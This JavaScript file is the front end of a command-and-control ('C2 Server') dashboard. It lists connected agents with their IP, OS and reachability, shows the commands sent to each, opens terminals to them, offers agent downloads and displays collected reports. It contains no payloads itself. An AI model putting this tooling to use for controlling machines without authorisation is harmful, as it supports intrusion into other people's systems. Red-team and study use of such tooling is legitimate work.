// Global variables to manage number of active connections
let previousActiveCount = 0;
// Set to track watched connections by their IDs
let watched = new Set();
// Set to track loaded reports by filename
let loadedReports = new Set();
// Set to track updated reports by clientID
let updatedReports = new Set();
// Map to track agent names by their IDs
let agentName = new Map();
// Save the order of reports (by clientID) regarding timestamp
let updatedOrder = [];
// Graph variable
let cy;




/* ------------------------- */
/*  LOGS                    */
/* ------------------------- */
function loadLogs() {
  fetch('/api/logs')
    .then(res => res.text())
    .then(text => {
      document.getElementById('logs').textContent = text.replace(/^\n+/, '');
    });
}


/* ------------------------- */
/*  COMMANDES                */
/* ------------------------- */
function loadCommands() {
  fetch('/api/commands')
    .then(res => res.json())
    .then(data => {
      const filter = document.getElementById('command-filter').value.toLowerCase();
      const container = document.getElementById('commands-list');
      container.innerHTML = '';

      for (const id in data) {
        const list = data[id];
        const matchId = id.toLowerCase().includes(filter);
        const filtered = list.filter(cmd => cmd.toLowerCase().includes(filter));
        if (!matchId && filtered.length === 0 || data[id].length === 0) continue;

        const cmds = matchId ? list : filtered;
        const card = document.createElement('div');
        card.className = 'command-card bg-black p-2 rounded shadow mb-2 cursor-pointer';

        let inner = `<h4 class="text-green-300 font-mono text-sm mb-1">${agentName.get(id)}-${id}</h4>`;
        cmds.forEach((cmd, i) => {
          inner += `
            <div title="${cmd}" class="text-xs font-mono truncate flex-1 min-w-0 mr-2">
              ${i} - ${cmd}
            </div>`;
        });
        card.innerHTML = inner;

        card.addEventListener('click', () => toggleCommandsModal(id, list));
        container.appendChild(card);
      }
    });
}


/* ------------------------- */
/*  CONNEXIONS               */
/* ------------------------- */
function loadConnections() {
  fetch('/api/connections')
    .then(res => res.json())
    .then(data => {
      // Header count
      const count = Object.keys(data).length;
      const title = document.getElementById('active-conn-title');
      title.textContent = `ACTIVE AGENTS - ${count}`;

      if (count !== previousActiveCount) {
        title.classList.add('text-green-500');
        setTimeout(() => title.classList.remove('text-green-500'), 500);
      }
      previousActiveCount = count;

      // Filter & list
      const filter = document.getElementById('connection-filter').value.toLowerCase();
      const container = document.getElementById('connections-list');
      container.innerHTML = '';

      for (const id in data) {
        const info = data[id];
        agentName.set(id, info.name);
        const ok = [id, info.name, info.ip, info.os, info.port, info.lastConnection, info.type, info.reachable.toString()]
          .some(s => s.toLowerCase().includes(filter));
        if (!ok) continue;

        const card = document.createElement('div');
        card.classList.add(
          'connection-card',
          'p-2', 'rounded', 'shadow', 'mb-2', 'cursor-pointer'
        );

        // If selected, we activate the style
        if (watched.has(id)) {
          card.classList.add('connection-card--active');
        }

        const reachableColor = info.reachable ? 'text-green-400' : 'text-red-400';
        const reachbaleText = info.reachable ? 'true' : 'false';

        card.innerHTML = `
          <div class="flex justify-between items-center">
            <h4 class="text-green-300 font-mono text-sm" data-id="${id}"">${info.name}</h4>
            <button title="Delete Agent" class="text-red-500"
                    onclick="handleDelete(event,'${id}')">X</button>
          </div>
          <div class="text-xs">ID: ${info.id}</div>
          <div class="text-xs">OS: ${info.os}</div>
          <div class="text-xs">Type: ${info.type}</div>
          <div class="text-xs">Reachable: <span class="${reachableColor} font-bold">${reachbaleText}</span></div>
        `;

        card.addEventListener('click', () => {
          if (watched.has(id)) watched.delete(id);
          else watched.add(id);
          loadConnections();
          updateWatchedConnections();
        });

        container.appendChild(card);
      }
    });
}

/* ------------------------- */
/*  AGENTS                   */
/* ------------------------- */
function loadAgents() {
  fetch('/api/connections')
    .then(res => res.json())
    .then(data => {
      const filter = document.getElementById('agent-filter').value.toLowerCase();
      const tbody = document.getElementById('agents-table-body');
      tbody.innerHTML = ''

      for (const id in data) {
        const info = data[id];
        const ok = [id, info.name, info.ip, info.os, info.port, info.lastConnection, info.type, info.reachable.toString()]
          .some(s => s.toLowerCase().includes(filter));
        if (!ok) continue;

        const row = document.createElement('tr');
        displayName = info.name;
        row.setAttribute('data-id', id);
        
        row.className = 'border-t border-gray-700 hover:bg-gray-800 cursor-pointer';

        let nameCellContent = info.name;
        if (info.reachable) {
          nameCellContent = `<button onclick="accessTerminal('${info.name}', '${id}')" class="text-green-300 hover:bg-black px-2 py-1 rounded blinking">[>] ${info.name}</button>`;
        }

        row.innerHTML = `
          <td class="px-4 py-2 text-green-300">${nameCellContent}</td>
          <td class="px-4 py-2">${id}</td>
          <td class="px-4 py-2">${info.ip}</td>
          <td class="px-4 py-2">${info.port}</td>
          <td class="px-4 py-2">${info.os}</td>
          <td class="px-4 py-2">${info.type}</td>
          <td class="px-4 py-2">${info.lastConnection}</td>
          <td class="px-4 py-2">
            <img src="/static/img/icon/${info.icon}.ico" alt="${info.icon}" class="w-8 h-8 object-contain" />
          </td>
          <td id="info-reachable-agent" class="px-4 py-2 ${info.reachable ? 'text-green-600' : 'text-red-400'}">${info.reachable ? 'true' : 'false'}</td>
          <td class="px-4 py-2">
            <button title="Download Agent" class="bg-black hover:bg-blue-800 text-white px-2 py-1 rounded text-xs"
              onclick="downloadAgent('${info.name}','${id}','${info.os}','${info.type}', '${info.icon}')">
          📥
            </button>
            <button title="Shut down" class="bg-black hover:bg-blue-800 text-white px-2 py-1 rounded text-xs"
              onclick="shutDownConnection('${id}')">
          🛑
            </button>
            <button title="Delete Agent" class="bg-black hover:bg-blue-800 text-white px-2 py-1 rounded text-xs"
              onclick="delConnection('${id}')">
          ❌
            </button>
          </td>
        `;

        tbody.appendChild(row);
      }
    })
}

/* ------------------------- */
/*  GRAPH                    */
/* ------------------------- */
function loadGraph() {
  fetch('/api/connections')
    .then(res => res.json())
    .then(data => {
      console.log("Connections data:", data);
      const nodes = [];
      const edges = [];

      // Add main node C2 to nodes
      nodes.push({
        data: {id: 'c2', label: 'C2 Server'}
      });

      if (Object.keys(data).length > 0) {
      // Add agent as a node
        Object.values(data).forEach(agent => {
          nodes.push({
            data: {
              id: agent.id,
              label: agent.name,
              reachable: agent.reachable
            }
          });

          edges.push({
            data: {
              source: 'c2',
              target: agent.id,
              bidirectional: true
            }
          });
        });
      }

      cy = cytoscape({
        container: document.getElementById('c2-network-canvas'),
        elements: {nodes, edges},
        style: [
          {
            selector: 'node',
            style: {
              'background-color': ele => {
                if (ele.data('id') === 'c2') return '#2196f3'; // blue for C2
                return ele.data('reachable') ? '#4caf50' : '#f44336'; // green or red for agents
              },
              'label': 'data(label)',
              'color': '#fff',
              'text-valign': 'center',
              'text-halign': 'center',
              'font-size': '8px',
              'text-wrap': 'wrap',
              'text-max-width': '40px'
            }
          },
          {
            selector: 'edge',
            style: {
              'width': 2,
              'line-color': '#ccc',
              'curve-style': 'bezier',
              'target-arrow-shape': 'none',
              'source-arrow-shape': 'none'
            }
          }
        ],
        layout: {
          name: 'cose',
          padding: 10
        }
      });

      // Interaction : clic on a node
      cy.on('tap', 'node', function(evt){
        const node = evt.target;
        console.log('Targeted agent :', node.data());
      });
    })
    .catch(err => {
      console.error("Error when loading graph :", err);
    });

    document.getElementById('recenter-graph').onclick = () => {
      cy.fit();
    };
}




/* ------------------------- */
/*  RAPPORTS                 */
/* ------------------------- */
function loadReports() {
  fetch('/api/reports-list')
    .then(res => res.ok ? res.json() : Promise.reject())
    .then(files => {
      const filterValue = document.getElementById('report-filter').value.toLowerCase();
      const container = document.getElementById('reports-list');
      container.innerHTML = '';
      loadedReports.clear();

      // filter
      let list = files.filter(name => name.toLowerCase().includes(filterValue));

      const newIds = updatedOrder.slice() // clone for safety

      // set updatedReports
      list.sort((a, b) => {
        const aId = a.replace(/\.json$/, '');
        const bId = b.replace(/\.json$/, '');
        const aNew = updatedReports.has(aId);
        const bNew = updatedReports.has(bId);

        if (aNew && !bNew) return -1;
        if (!aNew && bNew) return 1;

        if (aNew && bNew) {
          const aIndex = newIds.indexOf(aId);
          const bIndex = newIds.indexOf(bId);
          // the greatest index (most recent) be at the top
          return bIndex - aIndex;
        }

        return 0;
      });

      loadedReports.clear();

      list.forEach(name => {
        if (loadedReports.has(name)) return;
        loadedReports.add(name);

        // isNew si dans le Set
        const RawName = name.replace(/\.json$/, '');
        const [agentName, clientID] = RawName.split('-');
        const isNew = updatedReports.has(clientID);

        displayReportFilename(name, isNew);
      });
    })
    .catch(() => {});
}

// Display a report filename in the list with buttons (overview tab)
function displayReportFilename(name, isNew = false) {
  const container = document.getElementById('reports-list');
  if (!container) return;

  const displayName = name.replace(/\.json$/, '');
  const [agentName, clientID] = displayName.split('-');
  const wrapper = document.createElement('div');
  wrapper.className = `
    bg-black text-green-300 font-mono text-xs
    px-2 py-1 rounded shadow m-1 flex items-center justify-between
    hover:bg-gray-800
    ${isNew ? 'highlight-report' : ''}
  `;
  wrapper.setAttribute('data-name', displayName);

  // Report name
  const label = document.createElement('div');
  label.textContent = displayName;
  label.className = 'cursor-pointer flex-1 truncate';
  label.addEventListener('click', () => {
    wrapper.classList.remove('highlight-report');
    updatedReports.delete(clientID);
    const idx = updatedOrder.indexOf(clientID);
    if (idx !== -1) updatedOrder.splice(idx, 1);

    loadReports();

    fetch(`/api/report?id=${encodeURIComponent(displayName)}`)
      .then(res => res.ok ? res.json() : Promise.reject('not found'))
      .then(data => toggleReportModal(name, data))
      .catch(err => console.error(err) || alert('Error loading report'));
  });

  // Remove button
  const deleteBtn = document.createElement('button');
  deleteBtn.textContent = '🗑️';
  deleteBtn.className = 'ml-2 text-red-400 hover:text-red-600';
  deleteBtn.title = 'Delete report';
  deleteBtn.onclick = (e) => {
    e.stopPropagation();
    if (!confirm(`Delete report ${name} ?`)) return;

    const form = new FormData();
    form.append('filename', name);
    form.append('IDtimestamp', displayName);

    fetch(`/api/del-report?id=${encodeURIComponent(displayName)}`, {
      method: 'POST',
      body: form
    })
      .then(res => res.ok ? res.text() : Promise.reject('Removing error'))
      .then(msg => {
        // alert(msg);
        loadReports();
      })
      .catch(err => alert(err));
  };

  // Export button
  const exportBtn = document.createElement('button');
  exportBtn.textContent = '📤';
  exportBtn.className = 'ml-2 text-blue-400 hover:text-blue-600';
  exportBtn.title = 'Export report';
  exportBtn.onclick = (e) => {
    e.stopPropagation();
    window.open(`/api/report?id=${encodeURIComponent(displayName)}`, '_blank');
  };

  // Packaging
  wrapper.appendChild(label);
  wrapper.appendChild(exportBtn);
  wrapper.appendChild(deleteBtn);
  container.appendChild(wrapper);
}